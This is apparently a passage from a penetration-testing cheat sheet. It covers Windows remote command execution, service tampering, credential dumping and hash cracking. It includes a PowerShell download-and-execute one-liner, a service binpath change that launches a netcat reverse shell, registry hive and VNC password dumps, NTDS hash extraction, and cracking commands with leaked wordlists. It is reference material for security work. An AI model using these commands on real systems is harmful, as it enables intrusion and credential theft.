paxy <span class="nt">-p</span> &lt;port&gt; &lt;pac&gt;
<span class="c"># Only listening in 127.0.0.1</span>
<span class="c"># See the readme for PAC escalability</span></code></pre></div></div></li> </ul> <h1 id="remote-command-execution"> <a href="#remote-command-execution" class="anchor-heading" aria-labelledby="remote-command-execution"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Remote Command Execution </h1> <h2 id="remote-command-execution--windows"> <a href="#remote-command-execution--windows" class="anchor-heading" aria-labelledby="remote-command-execution--windows"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Windows </h2> <ul> <li>PowerShell to run commands remotely via sessions:<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$sess <span class="o">=</span> <span class="kd">New</span><span class="na">-PSSession -Computer </span><span class="o">&lt;</span><span class="kd">computer</span><span class="na">-name</span><span class="o">&gt;</span>
<span class="kd">Invoke</span><span class="na">-Command -Session </span>$sess <span class="na">-ScriptBlock </span><span class="o">{&lt;</span><span class="kd">command</span><span class="o">&gt;}</span>
<span class="kd">Copy</span><span class="na">-Item </span><span class="s2">"C:\&lt;local-path&gt;"</span> <span class="na">-Destination </span><span class="s2">"C:\&lt;remote-path&gt;"</span> <span class="na">-ToSession </span>$sess</code></pre></div></div></li> <li>Powershell executing remote scripts locally with <a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-6">Invoke-Expression</a>, see more examples <a href="https://gist.github.com/jivoi/c354eaaf3019352ce32522f916c03d70">here</a><div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">powershell</span><span class="err">.exe</span> <span class="kd">IEX</span> <span class="o">(</span><span class="kd">New</span><span class="na">-Object </span><span class="kd">System</span>.Net.WebClient<span class="o">)</span>.DownloadString<span class="o">(</span><span class="s1">'http://&lt;ip&gt;/helloworld.ps1'</span><span class="o">)</span></code></pre></div></div></li> </ul> <h1 id="service-tampering"> <a href="#service-tampering" class="anchor-heading" aria-labelledby="service-tampering"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Service Tampering </h1> <h2 id="service-tampering--windows"> <a href="#service-tampering--windows" class="anchor-heading" aria-labelledby="service-tampering--windows"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Windows </h2> <ul> <li>List services and their permissions:<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sc</span> <span class="nb">query</span>

<span class="nb">sc</span> <span class="kd">qc</span> <span class="o">&lt;</span><span class="kd">service</span><span class="na">-name</span><span class="o">&gt;</span></code></pre></div></div></li> <li>Change the command they execute:<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">:: Launch a reverse shell:</span>
<span class="nb">sc</span> <span class="kd">config</span> <span class="o">&lt;</span><span class="kd">service</span><span class="na">-name</span><span class="o">&gt;</span> <span class="kd">binpath</span><span class="o">=</span> <span class="s2">"C:\&lt;path-to-nc&gt;.exe -n &lt;ip&gt; &lt;port&gt; -e C:\WINDOWS\System32\cmd.exe"</span>

<span class="nb">sc</span> <span class="kd">config</span> <span class="o">&lt;</span><span class="kd">service</span><span class="na">-name</span><span class="o">&gt;</span> <span class="kd">obj</span><span class="o">=</span> <span class="s2">".\LocalSystem"</span> <span class="kd">password</span><span class="o">=</span> <span class="s2">""</span>

<span class="c">:: Verify the changes</span>
<span class="nb">sc</span> <span class="kd">qc</span> <span class="o">&lt;</span><span class="kd">service</span><span class="na">-name</span><span class="o">&gt;</span></code></pre></div></div></li> <li>Start the service:<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">net</span> <span class="nb">start</span> <span class="o">&lt;</span><span class="kd">service</span><span class="na">-name</span><span class="o">&gt;</span></code></pre></div></div></li> </ul> <h1 id="credentials"> <a href="#credentials" class="anchor-heading" aria-labelledby="credentials"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Credentials </h1> <h2 id="credentials--dump"> <a href="#credentials--dump" class="anchor-heading" aria-labelledby="credentials--dump"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Dump </h2> <h3 id="credentials--dump--windows"> <a href="#credentials--dump--windows" class="anchor-heading" aria-labelledby="credentials--dump--windows"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Windows </h3> <h4 id="credentials--dump--windows--common-registry--logs--etc"> <a href="#credentials--dump--windows--common-registry--logs--etc" class="anchor-heading" aria-labelledby="credentials--dump--windows--common-registry--logs--etc"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Common Registry, logs, etc </h4> <h5 id="credentials--dump--windows--common-registry--logs--etc--batch---cmd-exe"> <a href="#credentials--dump--windows--common-registry--logs--etc--batch---cmd-exe" class="anchor-heading" aria-labelledby="credentials--dump--windows--common-registry--logs--etc--batch---cmd-exe"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Batch / cmd.exe </h5> <ul> <li>Dump the SAM and System databases to get the hashes using <code>samdump2 System SAM</code>:<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">:: /y -&gt; yes ; /c -&gt; compress</span>
<span class="nb">reg</span> <span class="kd">save</span> <span class="kd">HKLM</span>\System <span class="kd">C</span>:\System
<span class="nb">reg</span> <span class="kd">save</span> <span class="kd">HKLM</span>\SAM <span class="kd">C</span>:\SAM</code></pre></div></div></li> <li>Software and Security:<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">reg</span> <span class="kd">save</span> <span class="kd">HKLM</span>\Security <span class="kd">C</span>:\Security
<span class="nb">reg</span> <span class="kd">save</span> <span class="kd">HKLM</span>\Software <span class="kd">C</span>:\Software</code></pre></div></div></li> <li>Default:<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">reg</span> <span class="kd">save</span> <span class="kd">HKEY_USERS</span>\.DEFAULT <span class="kd">C</span>:\DEFAULT</code></pre></div></div></li> <li>NTUSER (from all users):<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">:: Select user</span>
<span class="kd">ntuser</span> <span class="kd">hive</span> <span class="kd">C</span>:\Users\&lt;user&gt;\NTUSER.DAT

<span class="c">:: Try this if it doesn't work:</span>
<span class="nb">reg</span> <span class="kd">load</span> <span class="kd">HKEY_Users</span>\User&lt;USER&gt; <span class="s2">"C:\Users\&lt;user&gt;\NTUSER.DAT"</span>

<span class="c">:: Backup NTUSER.dat</span>
<span class="nb">reg</span> <span class="kd">save</span> <span class="kd">HKCU</span> <span class="kd">C</span>:\NTUSER.DAT

<span class="c">:: Backup UsrClass.dat</span>
<span class="nb">reg</span> <span class="kd">save</span> <span class="kd">HKCU</span>\Software\Classes <span class="kd">C</span>:\UsrClass.dat

<span class="c">:: Note that selecting an offline user may allow funny things</span>
<span class="kd">ntuser</span> <span class="kd">hive</span> <span class="kd">C</span>:\Users\Default\NTUSER.DAT
<span class="c">:: See http://smallvoid.com/article/winnt-reset-password.html</span></code></pre></div></div></li> <li>All the Registry Transaction Logs (<code>.LOG</code>) of the hives</li> <li>All the <code>.SAV</code> files</li> <li>Registry Backups: <code>%SystemRoot%\System32\config\RegBack</code></li> <li>Transactional Registry Transaction Log (<code>.TxR</code>)</li> <li>TODO - Find the location of: <ul> <li>Amcache: <code>C:\Windows\AppCompat\Programs</code></li> <li><a href="https://www.stevebunting.org/udpd4n6/forensics/restorepoints.htm">Restory Points</a></li> <li>Event log: <code>C:\WINDOWS\System32\winevt\logs</code></li> <li>Prefetch: <code>C:\Windows\Prefetch</code> (<code>.pf</code> files)</li> <li>Windows Error Reporting: <code>C:\ProgramData\Microsoft\Windows\WER\ReportArchive</code></li> <li>RDP cache <code>%USERPROFILE%\AppData\Local\Microsoft\Terminal ServerClient\Cache</code></li> <li>Recycle BIN: <code>C:\$RECYCLE.BIN</code> <ul> <li><a href="https://www.secjuice.com/windows-forensics-artifacts/">Find how to restore metadata</a></li> </ul> </li> <li>Windows Shortcuts: <code>%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Recent</code> <ul> <li><a href="https://www.secjuice.com/windows-forensics-artifacts-2/">Find how to read metadata</a></li> </ul> </li> <li>Recent Files / Most Used Files: <ul> <li><code>%USERPROFILE%\AppData\ Roaming\Microsoft\Windows\Recent\AutomaticDestinations</code></li> <li><code>%USERPROFILE%\AppData\ Roaming\Microsoft\Windows\Recent\CustomDestinations</code> <ul> <li><a href="https://www.secjuice.com/windows-forensics-artifacts-2/">Find how to process them</a></li> </ul> </li> </ul> </li> </ul> </li> <li><a href="https://www.sans.org/security-resources/posters/windows-forensic-analysis/170/download">Location Cheatsheet SANS</a></li> </ul> <h5 id="credentials--dump--windows--common-registry--logs--etc--impacket"> <a href="#credentials--dump--windows--common-registry--logs--etc--impacket" class="anchor-heading" aria-labelledby="credentials--dump--windows--common-registry--logs--etc--impacket"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Impacket </h5> <h6 id="credentials--dump--windows--common-registry--logs--etc--impacket--secretsdump"> <a href="#credentials--dump--windows--common-registry--logs--etc--impacket--secretsdump" class="anchor-heading" aria-labelledby="credentials--dump--windows--common-registry--logs--etc--impacket--secretsdump"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Secretsdump </h6> <ul> <li><a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py">Site</a> - Get NTLM hashes from NTDS.dit<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>secretsdump.py <span class="nt">-ntds</span> &lt;ntds.dit&gt; <span class="nt">-system</span> &lt;system-hive&gt;</code></pre></div></div></li> </ul> <h4 id="credentials--dump--windows--vnc"> <a href="#credentials--dump--windows--vnc" class="anchor-heading" aria-labelledby="credentials--dump--windows--vnc"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> VNC </h4> <ul> <li>First locate the name of the folder under <code>Program Files</code> as it will match the registry name, for example: <ul> <li><code>C:\Program Files\RealVNC\WinVNC4</code> -&gt; Matches <code>RealVNC\WinVNC4</code> in the Reg</li> <li><code>C:\Program Files\RealVNC\WinVNC</code> -&gt; Matches <code>RealVNC\WinVNC</code> in the Reg</li> </ul> </li> <li>Reference <a href="https://www.raymond.cc/blog/crack-or-decrypt-vnc-server-encrypted-password/">raymond.cc</a></li> </ul> <h5 id="credentials--dump--windows--vnc--realvnc"> <a href="#credentials--dump--windows--vnc--realvnc" class="anchor-heading" aria-labelledby="credentials--dump--windows--vnc--realvnc"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> RealVNC </h5> <div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">reg</span> <span class="nb">query</span> <span class="kd">HKEY_LOCAL_MACHINE</span>\SOFTWARE\RealVNC\WinVNC4 <span class="na">/v </span><span class="kd">password</span>
<span class="c">:: Try Password as well</span></code></pre></div></div> <h5 id="credentials--dump--windows--vnc--tightvnc"> <a href="#credentials--dump--windows--vnc--tightvnc" class="anchor-heading" aria-labelledby="credentials--dump--windows--vnc--tightvnc"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> TightVNC </h5> <div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">reg</span> <span class="nb">query</span> <span class="kd">HKEY_CURRENT_USER</span>\Software\TightVNC\Server <span class="na">/v </span><span class="kd">password</span>
<span class="c">:: Try Password or PasswordViewOnly</span></code></pre></div></div> <h5 id="credentials--dump--windows--vnc--tigervnc"> <a href="#credentials--dump--windows--vnc--tigervnc" class="anchor-heading" aria-labelledby="credentials--dump--windows--vnc--tigervnc"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> TigerVNC </h5> <div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">reg</span> <span class="nb">query</span> <span class="kd">HKEY_LOCAL_USER</span>\Software\TigerVNC\WinVNC4 <span class="na">/v </span><span class="kd">password</span>
<span class="c">:: Try Password</span></code></pre></div></div> <h5 id="credentials--dump--windows--vnc--ultravnc"> <a href="#credentials--dump--windows--vnc--ultravnc" class="anchor-heading" aria-labelledby="credentials--dump--windows--vnc--ultravnc"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> UltraVNC </h5> <div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">type</span> <span class="s2">"C:\Program Files\UltraVNC\ultravnc.ini"</span>
<span class="c">:: Find it in passwd or passwd2</span></code></pre></div></div> <h2 id="credentials--import"> <a href="#credentials--import" class="anchor-heading" aria-labelledby="credentials--import"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Import </h2> <ul> <li>Apparently it is possible to import with <code>certutil</code> the CodeSingPCA.crl files as they are CA certificates</li> </ul> <h1 id="hashes"> <a href="#hashes" class="anchor-heading" aria-labelledby="hashes"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Hashes </h1> <h2 id="hashes--identification"> <a href="#hashes--identification" class="anchor-heading" aria-labelledby="hashes--identification"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Identification </h2> <h3 id="hashes--identification--name-that-hash"> <a href="#hashes--identification--name-that-hash" class="anchor-heading" aria-labelledby="hashes--identification--name-that-hash"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Name-That-Hash </h3> <ul> <li><a href="https://github.com/HashPals/Name-That-Hash">Site</a> - Identify and hashcat/john id<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nth <span class="nt">--no-banner</span> <span class="nt">--text</span> &lt;<span class="nb">hash</span><span class="o">&gt;</span></code></pre></div></div></li> </ul> <h3 id="hashes--identification--haiti"> <a href="#hashes--identification--haiti" class="anchor-heading" aria-labelledby="hashes--identification--haiti"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Haiti </h3> <ul> <li><a href="https://github.com/noraj/haiti">Site</a> - Identify hashes<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>haiti &lt;<span class="nb">hash</span><span class="o">&gt;</span></code></pre></div></div></li> </ul> <h2 id="hashes--bruteforce"> <a href="#hashes--bruteforce" class="anchor-heading" aria-labelledby="hashes--bruteforce"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Bruteforce </h2> <h3 id="hashes--bruteforce--wordlists"> <a href="#hashes--bruteforce--wordlists" class="anchor-heading" aria-labelledby="hashes--bruteforce--wordlists"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Wordlists </h3> <h4 id="hashes--bruteforce--wordlists--pre-made"> <a href="#hashes--bruteforce--wordlists--pre-made" class="anchor-heading" aria-labelledby="hashes--bruteforce--wordlists--pre-made"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Pre-made </h4> <h5 id="hashes--bruteforce--wordlists--pre-made--passwords"> <a href="#hashes--bruteforce--wordlists--pre-made--passwords" class="anchor-heading" aria-labelledby="hashes--bruteforce--wordlists--pre-made--passwords"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Passwords </h5> <ul> <li><a href="https://github.com/danielmiessler/SecLists/tree/master/Passwords">SecLists</a> <ul> <li><a href="https://github.com/danielmiessler/SecLists/raw/master/Passwords/Leaked-Databases/NordVPN.txt">NordVPN.txt</a></li> <li><a href="https://github.com/danielmiessler/SecLists/raw/master/Passwords/twitter-banned.txt">twitter-banned.txt</a></li> <li><a href="https://github.com/danielmiessler/SecLists/raw/master/Passwords/Leaked-Databases/hotmail.txt">hotmail.txt</a></li> <li><a href="https://github.com/danielmiessler/SecLists/raw/master/Passwords/Leaked-Databases/myspace.txt">myspace.txt</a></li> <li><a href="https://github.com/danielmiessler/SecLists/raw/master/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt">top-20-common-SSH-passwords.txt</a></li> <li><a href="https://github.com/danielmiessler/SecLists/raw/master/Passwords/unkown-azul.txt">unkown-azul.txt</a></li> <li><a href="https://github.com/danielmiessler/SecLists/raw/master/Passwords/cirt-default-passwords.txt">cirt-default-passwords.txt</a></li> <li><a href="https://github.com/danielmiessler/SecLists/raw/master/Passwords/2020-200_most_used_passwords.txt">2020-200_most_used_passwords.txt</a></li> <li><a href="https://github.com/danielmiessler/SecLists/raw/master/Passwords/Common-Credentials/10k-most-common.txt">10k-most-common.txt</a></li> <li><a href="https://github.com/danielmiessler/SecLists/raw/master/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt">10-million-passwd-top-1000000.txt</a></li> <li><a href="https://github.com/danielmiessler/SecLists/raw/master/Passwords/Leaked-Databases/alleged-gmail-passwords.txt">alleged-gmail-passwords.txt</a></li> <li><a href="https://github.com/danielmiessler/SecLists/raw/master/Passwords/Leaked-Databases/rockyou.txt.tar.gz">rockyou.txt.tar.gz</a></li> </ul> </li> <li><a href="https://wiki.skullsecurity.org/Passwords">SkullSecurity</a></li> <li><a href="https://github.com/berzerk0/Probable-Wordlists">Probable-Wordlists</a></li> </ul> <h5 id="hashes--bruteforce--wordlists--pre-made--users"> <a href="#hashes--bruteforce--wordlists--pre-made--users" class="anchor-heading" aria-labelledby="hashes--bruteforce--wordlists--pre-made--users"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Users </h5> <ul> <li><a href="https://github.com/danielmiessler/SecLists/tree/master/Usernames">SecLists</a> <ul> <li><a href="https://github.com/danielmiessler/SecLists/raw/master/Usernames/cirt-default-usernames.txt">cirt-default-usernames.txt</a></li> <li><a href="https://github.com/danielmiessler/SecLists/raw/master/Usernames/sap-default-usernames.txt">sap-default-usernames.txt</a></li> <li><a href="https://github.com/danielmiessler/SecLists/raw/master/Usernames/Names/names.txt">names.txt</a></li> <li><a href="https://github.com/danielmiessler/SecLists/raw/master/Usernames/xato-net-10-million-usernames.txt">xato-net-10-million-usernames.txt</a></li> </ul> </li> </ul> <h4 id="hashes--bruteforce--wordlists--tools"> <a href="#hashes--bruteforce--wordlists--tools" class="anchor-heading" aria-labelledby="hashes--bruteforce--wordlists--tools"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Tools </h4> <h5 id="hashes--bruteforce--wordlists--tools--cewl"> <a href="#hashes--bruteforce--wordlists--tools--cewl" class="anchor-heading" aria-labelledby="hashes--bruteforce--wordlists--tools--cewl"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> CeWL </h5> <ul> <li><a href="https://github.com/digininja/CeWL">Site</a> - Custom generator from website:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cewl <span class="nt">-d</span> 9 <span class="nt">-w</span> &lt;outlist&gt; <span class="nt">-e</span> <span class="nt">--email_file</span> &lt;oemailist&gt; <span class="nt">-a</span> <span class="nt">--meta_file</span> &lt;ometalist&gt; &lt;url&gt;
<span class="c"># -d &lt;dep&gt; - Scrap depth high=crash</span>
<span class="c"># -m &lt;len&gt; - Minimum word length</span>
<span class="c"># -o - Spider also out-scope sites</span>
<span class="c"># -n - Don't show the words found</span>
<span class="c"># -c - Show the word count</span>
<span class="c"># -u &lt;UA&gt; - Set User Agent</span>
<span class="c"># --proxy_host | --proxy_port</span>
<span class="c"># --auth_type  | --auth_user/pass</span></code></pre></div></div></li> </ul> <h5 id="hashes--bruteforce--wordlists--tools--duplicut"> <a href="#hashes--bruteforce--wordlists--tools--duplicut" class="anchor-heading" aria-labelledby="hashes--bruteforce--wordlists--tools--duplicut"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Duplicut </h5> <ul> <li><a href="https://github.com/nil0x42/duplicut">Site</a> - Remove duplicates without sort<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>duplicut <span class="nt">-l</span> 255 &lt;ddict&gt; <span class="nt">-o</span> &lt;udict&gt;
<span class="c"># -l &lt;num&gt;  Filters len str &gt; &lt;num&gt;</span>
<span class="c"># -p        Filters non-ASCII lines</span></code></pre></div></div></li> <li>Remove words from other dictionaries:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Using bash/zsh pipes</span>
duplicut <span class="nt">-l</span> 255 &lt;<span class="o">(</span><span class="nb">cat</span> &lt;odict&gt; &lt;<span class="o">(</span><span class="nb">echo</span> <span class="s2">"-&lt;ndict&gt;-"</span><span class="o">)</span> &lt;ndict&gt;<span class="o">)</span> <span class="nt">-o</span> <span class="o">&gt;(</span><span class="nb">sed</span> <span class="nt">-n</span> <span class="s1">'/-&lt;ndict&gt;-/{:a;n;p;ba;}'</span> <span class="o">&gt;</span> &lt;cndict&gt;<span class="o">)</span>
<span class="c"># or sed -n '/-&lt;ndict&gt;-/,${//!p}'</span></code></pre></div></div></li> </ul> <h5 id="hashes--bruteforce--wordlists--tools--crunch"> <a href="#hashes--bruteforce--wordlists--tools--crunch" class="anchor-heading" aria-labelledby="hashes--bruteforce--wordlists--tools--crunch"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Crunch </h5> <ul> <li><a href="https://github.com/crunchsec/crunch">Site</a> - Custom wordlist generator</li> <li>In almost all cracking circumstances is better to use John/Hashcat rules</li> <li>Find lengthy examples in this <a href="https://adaywithtape.blogspot.com/2011/05/creating-wordlists-with-crunch-v30.html">post</a>:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>crunch &lt;min-len&gt; &lt;max-len&gt; <span class="nt">-f</span> charset.lst &lt;setname&gt; <span class="nt">-t</span> &lt;pattern&gt;
<span class="c"># -o &lt;out-file&gt; - Save to file</span>
<span class="c">#</span>
<span class="c"># &lt;pattern&gt; @ substitutes -f &lt;set&gt;</span>
<span class="c">#</span>
<span class="c"># If NO -f, &lt;pattern&gt; specials are:</span>
<span class="c">#   @  -&gt;  lower-case characters</span>
<span class="c">#   ,  -&gt;  upper-case characters</span>
<span class="c">#   %  -&gt;  numbers</span>
<span class="c">#   ^  -&gt;  symbols (space included)</span>

<span class="c"># Word of length 11 with symbols:</span>
crunch 11 11 <span class="nt">-f</span> &lt;charset.lst&gt; symbols-all <span class="nt">-t</span> Morris1984@
<span class="c"># -f symbols-all has no whitespace</span>

<span class="c"># Equivalent without -f</span>
crunch 11 11 <span class="nt">-t</span> Morris1984^
<span class="c"># ^ includes whitespace</span></code></pre></div></div></li> </ul> <h3 id="hashes--bruteforce--john-the-ripper"> <a href="#hashes--bruteforce--john-the-ripper" class="anchor-heading" aria-labelledby="hashes--bruteforce--john-the-ripper"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> John The Ripper </h3> <ul> <li><a href="https://github.com/openwall/john/tree/bleeding-jumbo/run">Tools to format to hash.john</a> <ul> <li>Tools like: <code>ssh2john</code>, <code>rar2john</code>&#8230;</li> </ul> </li> <li><a href="https://openwall.info/wiki/john/rules">Best Rules</a> - Get <a href="https://github.com/kost/jtr-stuff/tree/master/rules">last</a> KoreLogic-derived<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Include them in the ruleset</span>
<span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/john/john.conf &lt; &lt;new.rules&gt; <span class="o">&gt;</span>/dev/null

<span class="c"># Find the name of all the rules</span>
<span class="nb">awk</span> <span class="nt">-F</span><span class="s1">':|]'</span> <span class="s1">'/^\[.*Rules:/{print $2}'</span> /etc/john/john.conf | less</code></pre></div></div></li> <li>Automatically detects the hash or use: <code>hashid -j &lt;hash&gt;</code> (<code>-e</code> ask for more)</li> <li>Simple usage - Crack NTLM hashes<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>john <span class="nt">--format</span><span class="o">=</span>NT <span class="nt">--wordlist</span><span class="o">=</span>&lt;wordlist&gt; &lt;hashfile&gt;
<span class="c"># For NTLMv2 use: netntlmv2</span></code></pre></div></div></li> <li>All digits from 0 to 999999 - multi-process:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>john <span class="nt">--mask</span><span class="o">=</span><span class="s1">'?d'</span> <span class="nt">--min-length</span><span class="o">=</span>1 <span class="nt">--max-length</span><span class="o">=</span>6 <span class="nt">--fork</span><span class="o">=</span>8 &lt;hashfile&gt;</code></pre></div></div></li> <li>Read wordlist from stdin + apply <a href="http://www.openwall.com/john/doc/RULES.shtml">rules</a>:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s2">"test"</span> | john <span class="nt">--pipe</span> <span class="nt">--format</span><span class="o">=</span>NT <span class="nt">--rules</span><span class="o">=</span>KoreLogicRules &lt;hashfile&gt;

<span class="c"># Keep john interactive alt 1</span>
<span class="o">(</span><span class="nb">echo</span> <span class="s2">"test"</span> | <span class="nb">exec </span>john <span class="nt">--pipe</span> <span class="nt">--format</span><span class="o">=</span>NT <span class="nt">--rules</span><span class="o">=</span>KoreLogicRules &lt;hashfile&gt;<span class="o">)</span>

<span class="c"># Keep john interactive alt 2</span>
john <span class="nt">--pipe</span> <span class="nt">--format</span><span class="o">=</span>NT <span class="nt">--rules</span><span class="o">=</span>KoreLogicRules &lt;hashfile&gt; &lt; &lt;<span class="o">(</span><span class="nb">echo</span> <span class="s2">"test"</span><span class="o">)</span></code></pre></div></div></li> <li>List detected OpenCL devices<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>optirun <span class="nt">--no-xorg</span> <span class="nt">-b</span> none <span class="nt">--</span> pvkrun john <span class="nt">--list</span><span class="o">=</span>opencl-devices</code></pre></div></div></li> <li>Run on a dedicated device:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Note that only formats ending in</span>
<span class="c"># -opencl work</span>
<span class="nv">vblank_mode</span><span class="o">=</span>0 <span class="nb">nice</span> <span class="nt">-10</span> optirun <span class="nt">--no-xorg</span> <span class="nt">-b</span> none <span class="nt">--</span> pvkrun john <span class="nt">--pipe</span> <span class="nt">--rules</span><span class="o">=</span>All <span class="nt">--devices</span><span class="o">=</span>1 <span class="nt">--format</span><span class="o">=</span>&lt;hashtype&gt;-opencl &lt;hashfile&gt; &lt; &lt;<span class="o">(</span><span class="nb">echo</span> <span class="s2">"test"</span><span class="o">)</span>

<span class="c"># Obtain information</span>
pkill <span class="nt">-USR1</span> john

<span class="c"># Exit john without killing optirun</span>
pkill <span class="nt">-INT</span> john</code></pre></div></div></li> <li>Run on multiple devices at once<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Not recommended as it doesn't</span>
<span class="c"># support reading from stdin nor</span>
<span class="c"># splits according to the</span>
<span class="c"># processing capabilities, unlike</span>
<span class="c"># hashcat</span>
<span class="nv">vblank_mode</span><span class="o">=</span>0 <span class="nb">nice</span> <span class="nt">-10</span> optirun <span class="nt">--no-xorg</span> <span class="nt">-b</span> none <span class="nt">--</span> pvkrun john <span class="nt">--fork</span><span class="o">=</span>2 <span class="nt">--devices</span><span class="o">=</span>1,2 <span class="nt">--format</span><span class="o">=</span>&lt;hashtype&gt;-opencl <span class="nt">--wordlist</span><span class="o">=</span>&lt;wordlist&gt; &lt;hashfile&gt;</code></pre></div></div></li> <li>TODO - Gen dictionary with rules (<a href="https://charlesreid1.com/wiki/John_the_Ripper/Password_Generation">see</a>)</li> </ul> <h3 id="hashes--bruteforce--hashcat"> <a href="#hashes--bruteforce--hashcat" class="anchor-heading" aria-labelledby="hashes--bruteforce--hashcat"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Hashcat </h3> <h4 id="hashes--bruteforce--hashcat--installation"> <a href="#hashes--bruteforce--hashcat--installation" class="anchor-heading" aria-labelledby="hashes--bruteforce--hashcat--installation"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Installation </h4> <ul> <li>Pacman - cuda - dGPU</li> <li>Pacman - intel-compute-runtime - iGPU</li> <li>AUR - intel-cpu-runtime - CPU</li> <li>AUR - hashcat-git</li> <li>AUR - hashcat-utils-git</li> </ul> <h4 id="hashes--bruteforce--hashcat--old-packages-legacy-systems---unneeded"> <a href="#hashes--bruteforce--hashcat--old-packages-legacy-systems---unneeded" class="anchor-heading" aria-labelledby="hashes--bruteforce--hashcat--old-packages-legacy-systems---unneeded"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Old packages/Legacy Systems - Unneeded </h4> <ul> <li>AUR - intel-opencl - CPU</li> <li>AUR - intel-opencl-runtime - CPU</li> </ul> <h4 id="hashes--bruteforce--hashcat--rules"> <a href="#hashes--bruteforce--hashcat--rules" class="anchor-heading" aria-labelledby="hashes--bruteforce--hashcat--rules"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Rules </h4> <ul> <li><a href="https://github.com/rarecoil/pantagrule">Pantragrule</a> - Better and more efficient <code>rockyou.txt</code></li> <li><a 